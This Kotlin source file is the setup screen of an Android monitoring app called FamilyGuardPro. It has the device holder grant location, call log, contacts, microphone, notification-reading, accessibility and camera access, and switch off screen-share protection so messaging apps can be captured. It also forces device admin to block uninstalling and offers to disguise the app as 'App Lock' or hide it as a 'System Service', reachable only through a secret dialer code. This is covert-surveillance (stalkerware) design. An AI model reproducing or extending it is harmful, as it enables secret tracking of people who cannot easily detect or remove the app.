package com.familyguardpro

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.familyguardpro.databinding.ActivitySetupBinding
import com.familyguardpro.network.ApiClient
import com.familyguardpro.services.DeviceAdminReceiver
import com.familyguardpro.services.ServiceWatchdog
import com.familyguardpro.utils.DeviceUtils
import com.familyguardpro.utils.PermissionsHelper
import kotlinx.coroutines.launch

class SetupActivity : AppCompatActivity() {
    
    private lateinit var binding: ActivitySetupBinding
    private var currentStep = 1
    private val totalSteps = 14  // Includes Restricted Settings, Screen Share Protection and Auto-Start permissions
    private var pairingCode: String? = null
    
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        updateStepUI()
        if (results.values.all { it }) {
            nextStep()
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySetupBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        pairingCode = intent.getStringExtra("pairingCode")
        
        setupUI()
        updateStepUI()
    }
    
    private fun setupUI() {
        binding.btnAction.setOnClickListener {
            handleStepAction()
        }
        
        binding.tvSkip.setOnClickListener {
            nextStep()
        }
        
        // Back button functionality
        binding.tvBack?.setOnClickListener {
            previousStep()
        }
    }
    
    private fun previousStep() {
        if (currentStep > 1) {
            currentStep--
            updateStepUI()
        }
    }
    
    private fun updateStepUI() {
        binding.progressIndicator.progress = currentStep
        binding.tvStepNumber.text = "Step $currentStep of $totalSteps"
        
        when (currentStep) {
            1 -> {
                binding.tvStepTitle.text = "Welcome"
                binding.tvStepDescription.text = "This device will be monitored by the parent. Let's set up the required permissions."
                binding.btnAction.text = "Continue"
                binding.tvSkip.visibility = View.GONE
                binding.tvBack?.visibility = View.GONE
            }
            2 -> {
                // RESTRICTED SETTINGS - FIRST (required on Android 13+ before Accessibility/Notification)
                binding.tvStepTitle.text = "Enable Restricted Settings"
                binding.tvStepDescription.text = "On Android 13+, you need to allow 'Restricted Settings' for this app to enable Accessibility and Notification access.\n\n" +
                    "Steps:\n1. Tap 'Open Settings'\n2. Tap the 3-dot menu (top right)\n3. Select 'Allow restricted settings'\n4. Confirm with your pattern/PIN"
                binding.btnAction.text = "Open Settings"
                binding.tvSkip.visibility = View.VISIBLE
                // Show as granted if Android < 13, otherwise show as not granted (can't check programmatically)
                updatePermissionStatus(!DeviceUtils.needsRestrictedSettings())
            }
            3 -> {
                binding.tvStepTitle.text = "Basic Permissions"
                binding.tvStepDescription.text = "We need location, phone, and storage permissions to monitor the device."
                binding.btnAction.text = "Grant Permissions"
                binding.tvSkip.visibility = View.VISIBLE
                updatePermissionStatus(PermissionsHelper.hasBasicPermissions(this))
            }
            4 -> {
                binding.tvStepTitle.text = "Background Location"
                binding.tvStepDescription.text = "Allow location access all the time for continuous tracking."
                binding.btnAction.text = "Grant Permission"
                binding.tvSkip.visibility = View.VISIBLE
                updatePermissionStatus(PermissionsHelper.hasBackgroundLocation(this))
            }
            5 -> {
                binding.tvStepTitle.text = "Usage Access"
                binding.tvStepDescription.text = "This allows monitoring of app usage on the device."
                binding.btnAction.text = "Open Settings"
                binding.tvSkip.visibility = View.VISIBLE
                updatePermissionStatus(PermissionsHelper.hasUsageAccess(this))
            }
            6 -> {
                binding.tvStepTitle.text = "Notification Access"
                binding.tvStepDescription.text = "This allows reading notifications from messaging apps."
                binding.btnAction.text = "Open Settings"
                binding.tvSkip.visibility = View.VISIBLE
                updatePermissionStatus(PermissionsHelper.hasNotificationAccess(this))
            }
            7 -> {
                binding.tvStepTitle.text = "Accessibility Service"
                binding.tvStepDescription.text = "Enable accessibility for advanced monitoring features."
                binding.btnAction.text = "Open Settings"
                binding.tvSkip.visibility = View.VISIBLE
                updatePermissionStatus(PermissionsHelper.hasAccessibilityAccess(this))
            }
            8 -> {
                binding.tvStepTitle.text = "Camera Permission"
                binding.tvStepDescription.text = "Allow camera access for intruder selfie and remote camera features."
                binding.btnAction.text = "Grant Permission"
                binding.tvSkip.visibility = View.VISIBLE
                updatePermissionStatus(ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED)
            }
            9 -> {
                binding.tvStepTitle.text = "Screen Share Protection"
                binding.tvStepDescription.text = "IMPORTANT: Disable 'Screen Share Protection' to allow screen mirroring to capture all apps including Gallery and WhatsApp.\n\n" +
                    "Steps:\n1. Tap 'Open Settings'\n2. Find 'Screen Share Protection' or 'Screen Recording Protection'\n3. Turn it OFF"
                binding.btnAction.text = "Open Settings"
                binding.tvSkip.visibility = View.VISIBLE
                // Can't check this programmatically
                updatePermissionStatus(false)
            }
            10 -> {
                binding.tvStepTitle.text = "Display Overlay"
                binding.tvStepDescription.text = "Allow app to display over other apps for app blocking features."
                binding.btnAction.text = "Open Settings"
                binding.tvSkip.visibility = View.VISIBLE
                updatePermissionStatus(Settings.canDrawOverlays(this))
            }
            11 -> {
                binding.tvStepTitle.text = "Device Admin (Required)"
                binding.tvStepDescription.text = "Enable device admin to prevent easy uninstall. This is required for maximum protection."
                binding.btnAction.text = "Enable"
                binding.tvSkip.visibility = View.GONE // Cannot skip this step
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
                updatePermissionStatus(dpm.isAdminActive(adminComponent))
            }
            12 -> {
                binding.tvStepTitle.text = "Enable Auto-Start"
                binding.tvStepDescription.text = "CRITICAL: Allow app to start automatically. Without this, the app will stop working after reboot or when the system kills it."
                binding.btnAction.text = "Open Settings"
                binding.tvSkip.visibility = View.VISIBLE
                // Can't check auto-start programmatically, so show as not granted if manufacturer needs it
                updatePermissionStatus(!DeviceUtils.needsSpecialBackgroundHandling())
            }
            13 -> {
                binding.tvStepTitle.text = "Battery Optimization"
                binding.tvStepDescription.text = "Disable battery optimization to keep the app running in background."
                binding.btnAction.text = "Open Settings"
                binding.tvSkip.visibility = View.VISIBLE
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                updatePermissionStatus(pm.isIgnoringBatteryOptimizations(packageName))
            }
            14 -> {
                binding.tvStepTitle.text = "Setup Complete"
                binding.tvStepDescription.text = "The device is now configured for monitoring. All data will be synced automatically."
                binding.btnAction.text = "Finish Setup"
                binding.tvSkip.visibility = View.GONE
                binding.cardPermissionStatus.visibility = View.VISIBLE
                binding.tvPermissionStatus.text = "Setup Completed Successfully"
                binding.tvPermissionStatus.setTextColor(ContextCompat.getColor(this, R.color.success))
            }
        }
        
        // Always show back button for steps 2+ (except step 8 which doesn't need skip)
        binding.tvBack?.visibility = if (currentStep > 1) View.VISIBLE else View.GONE
    }
    
    private fun updatePermissionStatus(granted: Boolean) {
        if (granted) {
            binding.cardPermissionStatus.visibility = View.VISIBLE
            binding.tvPermissionStatus.text = "Permission Granted ✓"
            binding.tvPermissionStatus.setTextColor(ContextCompat.getColor(this, R.color.success))
            // Change Skip to Next when permission is granted
            binding.tvSkip.text = "Next"
        } else {
            binding.cardPermissionStatus.visibility = View.GONE
            binding.tvSkip.text = "Skip"
        }
    }
    
    private fun handleStepAction() {
        when (currentStep) {
            1 -> nextStep()
            2 -> openRestrictedSettings()  // Restricted Settings FIRST
            3 -> requestBasicPermissions()
            4 -> requestBackgroundLocation()
            5 -> openUsageAccessSettings()
            6 -> openNotificationAccessSettings()
            7 -> openAccessibilitySettings()
            8 -> requestCameraPermission()
            9 -> openScreenShareProtectionSettings()
            10 -> openOverlaySettings()
            11 -> {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
                if (!dpm.isAdminActive(adminComponent)) {
                    requestDeviceAdmin()
                } else {
                    nextStep()
                }
            }
            12 -> openAutoStartSettings()
            13 -> openBatterySettings()
            14 -> finishSetup()
        }
    }
    
    private fun requestBasicPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        permissionLauncher.launch(permissions.toTypedArray())
    }
    
    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissionLauncher.launch(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION))
        } else {
            nextStep()
        }
    }
    
    private fun openUsageAccessSettings() {
        startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
    }
    
    private fun openNotificationAccessSettings() {
        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
    }
    
    private fun openAccessibilitySettings() {
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }
    
    private fun requestCameraPermission() {
        permissionLauncher.launch(arrayOf(Manifest.permission.CAMERA))
    }
    
    private fun openOverlaySettings() {
        try {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:$packageName")
            })
        } catch (e: Exception) {
            Toast.makeText(this, "Cannot open overlay settings", Toast.LENGTH_SHORT).show()
        }
    }
    
    private fun requestDeviceAdmin() {
        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable device admin for advanced monitoring features")
        }
        startActivity(intent)
    }

    /**
     * Open app info settings for enabling "Allow restricted settings"
     * Required on Android 13+ for Accessibility and Notification Listener
     */
    private fun openRestrictedSettings() {
        val opened = DeviceUtils.openRestrictedSettings(this)
        if (!opened) {
            Toast.makeText(this, "Could not open settings. You may skip this step.", Toast.LENGTH_LONG).show()
        } else if (!DeviceUtils.needsRestrictedSettings()) {
            Toast.makeText(this, "This step is not required on your device. You may skip it.", Toast.LENGTH_SHORT).show()
        }
    }
    
    /**
     * Open manufacturer-specific Auto-Start settings
     * CRITICAL for MIUI, Huawei, Oppo, Vivo devices
     */
    private fun openAutoStartSettings() {
        val opened = DeviceUtils.openAutoStartSettings(this)
        if (!opened) {
            Toast.makeText(this, "Auto-start settings not available on this device. You may skip this step.", Toast.LENGTH_LONG).show()
        }
    }
    
    /**
     * Open manufacturer-specific screen share protection settings
     * Required on Vivo and some other devices to disable screen recording protection
     */
    private fun openScreenShareProtectionSettings() {
        val opened = DeviceUtils.openScreenShareProtectionSettings(this)
        if (!opened) {
            Toast.makeText(this, "Screen share protection settings not found. You may skip this step.", Toast.LENGTH_LONG).show()
        }
    }
    
    private fun openBatterySettings() {
        try {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            })
        } catch (e: Exception) {
            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        }
    }
    
    private fun nextStep() {
        if (currentStep < totalSteps) {
            // Prevent moving past Device Admin step if not enabled
            if (currentStep == 11) {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
                if (!dpm.isAdminActive(adminComponent)) {
                    Toast.makeText(this, "Device Admin must be enabled to continue.", Toast.LENGTH_LONG).show()
                    return
                }
            }
            currentStep++
            updateStepUI()
        }
    }
    
    private fun finishSetup() {
        binding.progressBar.visibility = View.VISIBLE
        
        val prefs = (application as FamilyGuardApp).preferenceManager
        prefs.setIsChild(true)
        prefs.setSetupComplete(true)
        
        // Report permissions immediately after setup
        com.familyguardpro.utils.PermissionReporter.reportPermissions(this)
        
        // Start periodic sync worker
        com.familyguardpro.services.DataSyncWorker.schedulePeriodicSync(this)
        
        // Trigger immediate sync
        com.familyguardpro.services.DataSyncWorker.runImmediateSync(this)
        
        // Start service watchdog for health monitoring
        ServiceWatchdog.schedule(this)
        
        // Log device info
        DeviceUtils.logDeviceInfo()
        
        binding.progressBar.visibility = View.GONE
        Toast.makeText(this@SetupActivity, "Setup complete!", Toast.LENGTH_SHORT).show()
        
        // Check if MIUI device needs additional setup
        if (DeviceUtils.isMiui() && MiuiSetupActivity.isSetupNeeded(this)) {
            showMiuiSetupPrompt()
        } else {
            // Show disguise selection dialog
            showDisguiseSelectionDialog()
        }
    }
    
    private fun showMiuiSetupPrompt() {
        android.app.AlertDialog.Builder(this)
            .setTitle("${DeviceUtils.getManufacturerName()} Device Detected")
            .setMessage(
                "Your device uses MIUI which has aggressive background restrictions.\n\n" +
                "Without additional setup, the app WILL STOP WORKING after a few minutes.\n\n" +
                "Would you like to complete the MIUI-specific setup now?"
            )
            .setPositiveButton("Setup Now (Recommended)") { _, _ ->
                startActivity(Intent(this, MiuiSetupActivity::class.java))
                showDisguiseSelectionDialog()
            }
            .setNegativeButton("Later (Not Recommended)") { _, _ ->
                Toast.makeText(this, "You can run MIUI setup later from settings", Toast.LENGTH_LONG).show()
                showDisguiseSelectionDialog()
            }
            .setCancelable(false)
            .show()
    }
    
    private fun showDisguiseSelectionDialog() {
        val builder = android.app.AlertDialog.Builder(this)
        builder.setTitle("Choose App Appearance")
        builder.setMessage("How would you like the app to appear on this device?\n\nThis helps keep monitoring discreet.")
        builder.setCancelable(false)
        
        // Add FamilyGuard icon option
        builder.setNeutralButton("Keep Normal") { dialog, _ ->
            dialog.dismiss()
            // Keep as FamilyGuard (default)
            AppDisguiseManager.switchToNormalMode(this)
            goToChildStatus()
        }
        
        // Add App Lock option
        builder.setPositiveButton("App Lock") { dialog, _ ->
            dialog.dismiss()
            // Switch to App Lock disguise
            AppDisguiseManager.switchToAppLockMode(this)
            Toast.makeText(this, "App will appear as 'App Lock'", Toast.LENGTH_SHORT).show()
            goToChildStatus()
        }
        
        // Add Invisible option - TRULY INVISIBLE from launcher
        builder.setNegativeButton("Invisible") { dialog, _ ->
            dialog.dismiss()
            // Switch to FULLY INVISIBLE mode - app won't appear in launcher at all
            // Only visible in Settings > Apps as "System Service"
            AppDisguiseManager.switchToInvisibleMode(this)
            Toast.makeText(this, "App is now INVISIBLE!\n\nAccess via: *#*#00000#*#*\nor familyguard://open", Toast.LENGTH_LONG).show()
            goToChildStatus()
        }
        
        builder.show()
    }
    
    private fun goToChildStatus() {
        startActivity(Intent(this, ChildStatusActivity::class.java))
        finish()
    }
    
    override fun onResume() {
        super.onResume()
        updateStepUI()
    }
}
